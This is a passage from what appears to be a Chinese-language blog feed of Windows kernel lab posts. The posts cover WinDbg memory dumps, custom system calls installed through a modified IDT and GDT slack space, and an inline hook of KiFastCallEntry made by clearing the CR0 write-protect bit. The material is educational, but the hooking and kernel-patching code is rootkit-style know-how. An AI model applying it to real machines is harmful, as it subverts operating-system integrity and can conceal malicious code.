</span><br><span class="line">c0001064  0c889067 0025b067 039aa025 00000000</span><br><span class="line">c0001074  00000000 00000000 00000000 00000000</span><br><span class="line">c0001084  00000000 00000000 00000000 00000000</span><br><span class="line">c0001094  00000000 00000000 00000000 00000000</span><br><span class="line">c00010a4  00000000 00000000 00000000 00000000</span><br><span class="line">c00010b4  00000000 00000000 00000000 00000000</span><br><span class="line">c00010c4  00000000 00000000 00000000 00000000</span><br><span class="line">c00010d4  00000000 00000000 00000000 00000000</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!dd <span class="number">00000000007</span>f3064</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> <span class="number">7</span>f3064 <span class="number">0</span>c889067 <span class="number">0025</span>b067 <span class="number">039</span>aa025 <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> <span class="number">7</span>f3074 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> <span class="number">7</span>f3084 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> <span class="number">7</span>f3094 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> <span class="number">7</span>f30a4 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> <span class="number">7</span>f30b4 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> <span class="number">7</span>f30c4 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> <span class="number">7</span>f30d4 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">?? ((<span class="number">0</span>x04197B0 &gt;&gt; <span class="number">22</span>) &lt;&lt;<span class="number">2</span>) + <span class="number">0</span>xc0300000</span></span><br><span class="line">unsigned int 0xc0300004</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">dd <span class="number">0</span>xc0300004</span></span><br><span class="line">ReadVirtual: c0300004 not properly sign extended</span><br><span class="line">c0300004  007f3067 00000000 00000000 00000000</span><br><span class="line">c0300014  00000000 00000000 00000000 00000000</span><br><span class="line">c0300024  00000000 00000000 00000000 00000000</span><br><span class="line">c0300034  00000000 00000000 00000000 00000000</span><br><span class="line">c0300044  00000000 00000000 00000000 00000000</span><br><span class="line">c0300054  00000000 00000000 00000000 00000000</span><br><span class="line">c0300064  00000000 00000000 00000000 00000000</span><br><span class="line">c0300074  00000000 00000000 00000000 00000000</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!dd <span class="number">0000000001</span>fcc004</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="number">1</span>fcc004 <span class="number">007</span>f3067 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="number">1</span>fcc014 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="number">1</span>fcc024 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="number">1</span>fcc034 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="number">1</span>fcc044 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="number">1</span>fcc054 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="number">1</span>fcc064 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="number">1</span>fcc074 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br></pre></td></tr></table></figure><p>可以看到实际是一块物理内存</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核实验:系统调用(system call)</title>
      <link href="/2023/05/31/Windows-Kernel-Experiment-system-call/"/>
      <url>/2023/05/31/Windows-Kernel-Experiment-system-call/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows内核实验-系统调用-system-call"><a href="#Windows内核实验-系统调用-system-call" class="headerlink" title="Windows内核实验:系统调用(system call)"></a>Windows内核实验:系统调用(system call)</h1><p>实现两个系统调用，读和申请内核空间</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD <span class="title function_">ReadMem</span><span class="params">(DWORD address)</span> </span><br><span class="line">DWORD <span class="title function_">AllocMem</span><span class="params">(DWORD size)</span> </span><br></pre></td></tr></table></figure><p>ExAllocatePool分配一块内存或者在内核里找一块安全的内核不会用到的内存来存放指令</p><p>选取下面的空余内核内存</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">dq @gdtr l80</span></span><br><span class="line">8003f000  00000000`00000000 00cf9b00`0000ffff</span><br><span class="line">....... SystemCallEntry</span><br><span class="line">8003f120  00000000`8003f128 00000000`8003f130</span><br><span class="line">8003f130  00000000`8003f138 00000000`8003f140</span><br><span class="line">8003f140  00000000`8003f148 00000000`8003f150</span><br><span class="line">8003f150  00000000`8003f158 00000000`8003f160</span><br><span class="line">8003f160  00000000`8003f168 00000000`8003f170</span><br><span class="line">8003f170  00000000`8003f178 00000000`8003f180</span><br><span class="line">8003f180  00000000`8003f188 00000000`8003f190</span><br><span class="line">8003f190  00000000`8003f198 00000000`8003f1a0</span><br><span class="line">8003f1a0  00000000`8003f1a8 00000000`8003f1b0</span><br><span class="line">8003f1b0  00000000`8003f1b8 00000000`8003f1c0</span><br><span class="line">8003f1c0  00000000`8003f1c8 00000000`8003f1d0</span><br><span class="line">........  ReadMem</span><br><span class="line">8003f1d0  00000000`8003f1d8 00000000`8003f1e0</span><br><span class="line">8003f1e0  00000000`8003f1e8 00000000`8003f1f0</span><br><span class="line">8003f1f0  00000000`8003f1f8 00000000`8003f200</span><br><span class="line">8003f200  00000000`8003f208 00000000`8003f210</span><br><span class="line">........  AllocMem</span><br><span class="line">8003f210  00000000`8003f218 00000000`8003f220</span><br><span class="line">8003f220  00000000`8003f228 00000000`8003f230</span><br><span class="line">8003f230  00000000`8003f238 00000000`8003f240</span><br><span class="line">8003f240  00000000`8003f248 00000000`8003f250</span><br><span class="line">........</span><br><span class="line">8003f250  00000000`8003f258 00000000`8003f260</span><br><span class="line">8003f260  00000000`8003f268 00000000`8003f270</span><br><span class="line">........Service Table</span><br><span class="line">8003f270  00000000`8003f278 00000000`8003f280</span><br></pre></td></tr></table></figure><p>系统调用入口函数SystemCallEntry来通过eax的值在系统调用表Service Table里确定系统函数做系统调用</p><p>makeKernel.exe</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> AD_CALLENTRY, AD_READ, AD_ALLOC &#125;;</span><br><span class="line">DWORD Address[<span class="number">3</span>] = &#123; <span class="number">0x8003f120</span> ,<span class="number">0x8003f1d0</span>,<span class="number">0x8003f210</span> &#125;;</span><br><span class="line">PDWORD ServiceTable = (PDWORD)<span class="number">0x8003f270</span>;</span><br><span class="line">PDWORD IdtAddress = (PDWORD)<span class="number">0x8003f508</span>;</span><br><span class="line"><span class="type">size_t</span> i;</span><br><span class="line"><span class="type">char</span>* des;</span><br><span class="line"><span class="type">void</span> <span class="title function_">SystemCallEntry</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ReadMem</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">AllocMem</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push <span class="number">0x30</span></span><br><span class="line">        pop fs</span><br><span class="line">        sti</span><br><span class="line">    &#125;</span><br><span class="line">    des = (<span class="type">char</span>*)Address[AD_CALLENTRY];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0xb0</span>; i++) &#123;</span><br><span class="line">        *des = ((<span class="type">char</span>*)SystemCallEntry)[i];</span><br><span class="line">        des++;</span><br><span class="line">    &#125;</span><br><span class="line">    des = (<span class="type">char</span>*)Address[AD_READ];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x40</span>; i++) &#123;</span><br><span class="line">        *des = ((<span class="type">char</span>*)ReadMem)[i];</span><br><span class="line">        des++;</span><br><span class="line">    &#125;</span><br><span class="line">    des = (<span class="type">char</span>*)Address[AD_ALLOC];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x40</span>; i++) &#123;</span><br><span class="line">        *des = ((<span class="type">char</span>*)AllocMem)[i];</span><br><span class="line">        des++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//构建系统调用表</span></span><br><span class="line">    ServiceTable[<span class="number">0</span>] = Address[AD_READ];</span><br><span class="line">    ServiceTable[<span class="number">1</span>] = Address[AD_ALLOC];</span><br><span class="line">    <span class="comment">//构建21号中断为我们的系统调用入口SystemCallEntry地址</span></span><br><span class="line">    <span class="comment">//eq 8003f508 8003ee00`0008f120 </span></span><br><span class="line">    IdtAddress[<span class="number">0</span>] = <span class="number">0x0008f120</span>;</span><br><span class="line">    IdtAddress[<span class="number">1</span>] = <span class="number">0x8003ee00</span>;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        cli</span><br><span class="line">        push <span class="number">0x3B</span></span><br><span class="line">        pop fs</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __declspec(naked) SystemCallEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push <span class="number">0x30</span></span><br><span class="line">        pop fs</span><br><span class="line">        sti</span><br><span class="line">        <span class="comment">//中断后在内核栈里依次为 (可选出错码) r0_ret_eip r3_cs r3_eflag r3_esp r3_ss</span></span><br><span class="line">        <span class="comment">//+0xc取出三环的esp</span></span><br><span class="line">        mov ebx, ss: [esp + <span class="number">0xc</span>]</span><br><span class="line">        <span class="comment">//从三环栈里取出第一个参数给到rdi做fastcall(习惯了linux的fastcall，最后发现windows是ecx，edx懒得改了)</span></span><br><span class="line">        mov edi, ds: [ebx + <span class="number">4</span>]</span><br><span class="line">        <span class="comment">//根据eax在调用表里找到函数</span></span><br><span class="line">        mov ebx, <span class="number">0x8003f270</span></span><br><span class="line">        mov edx, [ebx + eax * <span class="number">4</span>]</span><br><span class="line">        call edx</span><br><span class="line"></span><br><span class="line">        cli</span><br><span class="line">        push <span class="number">0x3b</span></span><br><span class="line">        pop fs</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __declspec(naked) ReadMem() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, ds: [edi]</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __declspec(naked) AllocMem() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push edi</span><br><span class="line">        push <span class="number">0</span></span><br><span class="line">        mov edx, <span class="number">0x80533708</span></span><br><span class="line">        <span class="comment">//ExAllocatePool = 0x80533708;</span></span><br><span class="line">        <span class="comment">//ExAllocatePool是个stdcall，内平栈，不需要我们平栈</span></span><br><span class="line">        call edx</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != (DWORD)IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt();</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>三环测试程序ntdll.exe</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line">DWORD __declspec(naked) ReadMem(DWORD address) &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax,<span class="number">0</span><span class="comment">//系统调用号</span></span><br><span class="line">        <span class="type">int</span> <span class="number">0x21</span></span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">DWORD __declspec(naked) AllocMem(DWORD size) &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, <span class="number">1</span><span class="comment">////系统调用号</span></span><br><span class="line">        <span class="type">int</span> <span class="number">0x21</span></span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%x\n&quot;</span>,ReadMem(<span class="number">0x8003f00c</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%x&quot;</span>,AllocMem(<span class="number">0x10</span>));</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/31/Windows-Kernel-Experiment-system-call/image-20230531153550640.png" alt="image-20230531153550640"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核实验:InlineHook</title>
      <link href="/2023/05/29/Windows-Kernel-Experiment-InlineHook/"/>
      <url>/2023/05/29/Windows-Kernel-Experiment-InlineHook/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows内核实验-InlineHook"><a href="#Windows内核实验-InlineHook" class="headerlink" title="Windows内核实验:InlineHook"></a>Windows内核实验:InlineHook</h1><p>hook的话，我们肯定要把代码hook到内核空间里，所以必须要把代码写到内核里，我们可以利用ExAllocatePool分配一块内存或者在内核里找一块安全的内核不会用到的内存</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">dq @gdtr l100</span></span><br><span class="line">8003f000  00000000`00000000 00cf9b00`0000ffff</span><br><span class="line">8003f010  00cf9300`0000ffff 00cffb00`0000ffff</span><br><span class="line">8003f020  00cff300`0000ffff 80008b04`200020ab</span><br><span class="line">8003f030  ffc093df`f0000001 0040f300`00000fff</span><br><span class="line">......</span><br><span class="line">8003f110  f840933d`5400ffff 00000000`8003f120</span><br><span class="line">8003f120  00000000`8003f128 00000000`8003f130</span><br><span class="line">8003f130  00000000`8003f138 00000000`8003f140</span><br><span class="line">8003f140  00000000`8003f148 00000000`8003f150</span><br><span class="line">8003f150  00000000`8003f158 00000000`8003f160</span><br><span class="line">8003f160  00000000`8003f168 00000000`8003f170</span><br><span class="line">8003f170  00000000`8003f178 00000000`8003f180</span><br><span class="line">8003f180  00000000`8003f188 00000000`8003f190</span><br><span class="line">8003f190  00000000`8003f198 00000000`8003f1a0</span><br><span class="line">8003f1a0  00000000`8003f1a8 00000000`8003f1b0</span><br><span class="line">8003f1b0  00000000`8003f1b8 00000000`8003f1c0</span><br><span class="line">8003f1c0  00000000`8003f1c8 00000000`8003f1d0</span><br><span class="line">8003f1d0  00000000`8003f1d8 00000000`8003f1e0</span><br><span class="line">8003f1e0  00000000`8003f1e8 00000000`8003f1f0</span><br><span class="line">8003f1f0  00000000`8003f1f8 00000000`8003f200</span><br><span class="line">8003f200  00000000`8003f208 00000000`8003f210</span><br><span class="line">8003f210  00000000`8003f218 00000000`8003f220</span><br><span class="line">8003f220  00000000`8003f228 00000000`8003f230</span><br><span class="line">8003f230  00000000`8003f238 00000000`8003f240</span><br><span class="line">8003f240  00000000`8003f248 00000000`8003f250</span><br><span class="line">8003f250  00000000`8003f258 00000000`8003f260</span><br><span class="line">.........</span><br></pre></td></tr></table></figure><p>gdt表里其实有好多没有用的位置，完全满足我们写小代码hook的需求</p><p>hook的函数_KiFastCallEntry，这个函数会被频繁调用，3环到0环的需求是很频繁的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:80541510                               _KiFastCallEntry proc near              ; DATA XREF: KiLoadFastSyscallMachineSpecificRegisters(x)+24↑o</span><br><span class="line">.text:80541510</span><br><span class="line">.text:80541510 B9 23 00 00 00                mov     ecx, 23h ; &#x27;#&#x27;</span><br><span class="line">.text:80541515 6A 30                         push    30h ; &#x27;0&#x27;</span><br><span class="line">.text:80541517 0F A1                         pop     fs</span><br><span class="line">.text:80541519 8E D9                         mov     ds, ecx</span><br><span class="line">.text:8054151B 8E C1                         mov     es, ecx</span><br><span class="line">.text:8054151D 64 8B 0D 40 00 00 00          mov     ecx, large fs:40h</span><br><span class="line">.text:80541524 8B 61 04                      mov     esp, [ecx+4]</span><br><span class="line">.text:80541527 6A 23                         push    23h ; &#x27;#&#x27;</span><br><span class="line">.text:80541529 52                            push    edx</span><br><span class="line">.text:8054152A 9C                            pushf</span><br></pre></td></tr></table></figure><p>hook到8054151D处，这里ecx寄存器会再次被赋值，我们就可以利用ecx寄存器去避免jmp偏移地址的计算(膜拜周壑orz)</p><p>注入代码地址选择到gdt表8003f130处</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">JmpTarget</span><span class="params">()</span>;</span><br><span class="line"><span class="type">char</span>* p = (<span class="type">char</span> *)<span class="number">0x8003f130</span>;</span><br><span class="line"><span class="type">size_t</span> i;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push <span class="number">0x30</span></span><br><span class="line">        pop fs</span><br><span class="line">        sti</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x30</span>; i++) &#123;</span><br><span class="line">        <span class="comment">//裸函数里尽量不用局部变量，因为没有栈帧</span></span><br><span class="line">        <span class="comment">//试了一下如果这里用size_t i=0;的话，使用了寄存器edi计数，但是还是在用全局变量保险</span></span><br><span class="line">        *p = ((<span class="type">char</span>*)JmpTarget)[i];</span><br><span class="line">        p++;</span><br><span class="line">    &#125;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        cli <span class="comment">//这里关中断是为了防止还没把fs寄存器恢复时，被时钟中断调度走，导致其他程序用了不正确的fs寄存器而蓝屏</span></span><br><span class="line">        push <span class="number">0x3B</span></span><br><span class="line">        pop fs</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __declspec(naked) JmpTarget() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov ecx, <span class="number">0x23</span></span><br><span class="line">        push <span class="number">0x30</span></span><br><span class="line">        pop fs</span><br><span class="line">        mov ds, cx</span><br><span class="line">        mov es, cx</span><br><span class="line">        mov ecx,<span class="number">0x8054151D</span></span><br><span class="line">        jmp ecx</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt();</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kd&gt; u 0x8003f130 l30</span><br><span class="line">8003f130 b923000000      mov     ecx,23h</span><br><span class="line">8003f135 6a30            push    30h</span><br><span class="line">8003f137 0fa1            pop     fs</span><br><span class="line">8003f139 668ed9          mov     ds,cx</span><br><span class="line">8003f13c 668ec1          mov     es,cx</span><br><span class="line">8003f13f b91d155480      mov     ecx,offset nt!KiFastCallEntry+0xd (8054151d)</span><br><span class="line">8003f144 ffe1            jmp     ecx</span><br></pre></td></tr></table></figure><p>80541510这个地址是不可写的，CR0[16] WP（Write Protect） 写保护位，为1时，禁止内核级代码写用户级的只读内存页；为0时允许</p><p>偏移&#x3D;8003f130-80541515&#x3D;FFAF DC1B</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, cr0</span><br><span class="line">        and eax, not <span class="number">0x10000</span></span><br><span class="line">        mov cr0, eax</span><br><span class="line"></span><br><span class="line">        <span class="comment">//E9 1B DC AF FF</span></span><br><span class="line">        mov al, <span class="number">0xe9</span></span><br><span class="line">        mov ds : [<span class="number">0x80541510</span>] , al</span><br><span class="line">        mov dword ptr ds : [<span class="number">0x80541511</span>],<span class="number">0xFFAFDC1B</span></span><br><span class="line"></span><br><span class="line">        mov eax, cr0</span><br><span class="line">        or eax, <span class="number">0x10000</span></span><br><span class="line">        mov cr0, eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt();</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这样写代码去改_KiFastCallEntry入口点代码主要是因为我们是单核单线程的机器</p><p>如果是多核多线程，显然会有并发问题，比如我cpu1在改的过程中还没改完，此时调度到cpu2执行可能执行到我们还没改完的代码造成蓝屏，需要加把锁</p></blockquote><p>ok了</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">u 80541510</span></span><br><span class="line">nt!KiFastCallEntry:</span><br><span class="line">80541510 e91bdcafff      jmp     8003f130</span><br><span class="line">80541515 6a30            push    30h</span><br><span class="line">80541517 0fa1            pop     fs</span><br><span class="line">80541519 8ed9            mov     ds,cx</span><br><span class="line">8054151b 8ec1            mov     es,cx</span><br><span class="line">8054151d 648b0d40000000  mov     ecx,dword ptr fs:[40h]</span><br><span class="line">80541524 8b6104          mov     esp,dword ptr [ecx+4]</span><br><span class="line">80541527 6a23            push    23h</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">u 8003f130</span></span><br><span class="line">8003f130 b923000000      mov     ecx,23h</span><br><span class="line">8003f135 6a30            push    30h</span><br><span class="line">8003f137 0fa1            pop     fs</span><br><span class="line">8003f139 668ed9          mov     ds,cx</span><br><span class="line">8003f13c 668ec1          mov     es,cx</span><br><span class="line">8003f13f b91d155480      mov     ecx,offset nt!KiFastCallEntry+0xd (8054151d)</span><br><span class="line">8003f144 ffe1            jmp     ecx</span><br><span class="line">8003f146 cc              int     3</span><br></pre></td></tr></table></figure><p>然后我们就可以把寄存器都保存一下然后写自己的代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __declspec(naked) JmpTarget() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        pushad</span><br><span class="line">        pushfd</span><br><span class="line"> +++++your code++++++</span><br><span class="line">        popfd</span><br><span class="line">        popad</span><br><span class="line">        mov ecx, <span class="number">0x23</span></span><br><span class="line">        push <span class="number">0x30</span></span><br><span class="line">        pop fs</span><br><span class="line">        mov ds, cx</span><br><span class="line">        mov es, cx</span><br><span class="line">        mov ecx, <span class="number">0x8054151D</span></span><br><span class="line">        jmp ecx</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核实验:开中断&amp;&amp;API调用</title>
      <link href="/2023/05/29/Windows-Kernel-Experiment-Open-interrupt-API-call/"/>
      <url>/2023/05/29/Windows-Kernel-Experiment-Open-interrupt-API-call/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows内核实验-开中断-amp-amp-API调用"><a href="#Windows内核实验-开中断-amp-amp-API调用" class="headerlink" title="Windows内核实验:开中断&amp;&amp;API调用"></a>Windows内核实验:开中断&amp;&amp;API调用</h1><h2 id="开中断"><a href="#开中断" class="headerlink" title="开中断"></a>开中断</h2><p>前面验证过中断后eflags寄存器的第九位IF变为0，关中断</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">    label:</span><br><span class="line">        jmp label</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个时候时钟中断是不起作用的，这段代码一定是卡死的，如果我们直接开中断呢</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        sti</span><br><span class="line">    label:</span><br><span class="line">        jmp label</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个时候没有卡死，但是崩溃了</p><p>这是因为内核环境不对</p><p>_KiFastCallEntry函数主要用在ring3到ring0的特权级变换，为进入和返回内核模式做准备，他在开中断前做了一些准备工作</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">text:00469510                               _KiFastCallEntry proc near              ; DATA XREF: KiLoadFastSyscallMachineSpecificRegisters(x)+24↑o</span><br><span class="line">.text:00469510                                                                       ; _KiTrap01+74↓o</span><br><span class="line">.text:00469510</span><br><span class="line">.text:00469510                               var_B= byte ptr -0Bh</span><br><span class="line">.text:00469510</span><br><span class="line">.text:00469510                               ; FUNCTION CHUNK AT .text:004694DD SIZE 00000026 BYTES</span><br><span class="line">.text:00469510                               ; FUNCTION CHUNK AT .text:004697B0 SIZE 00000014 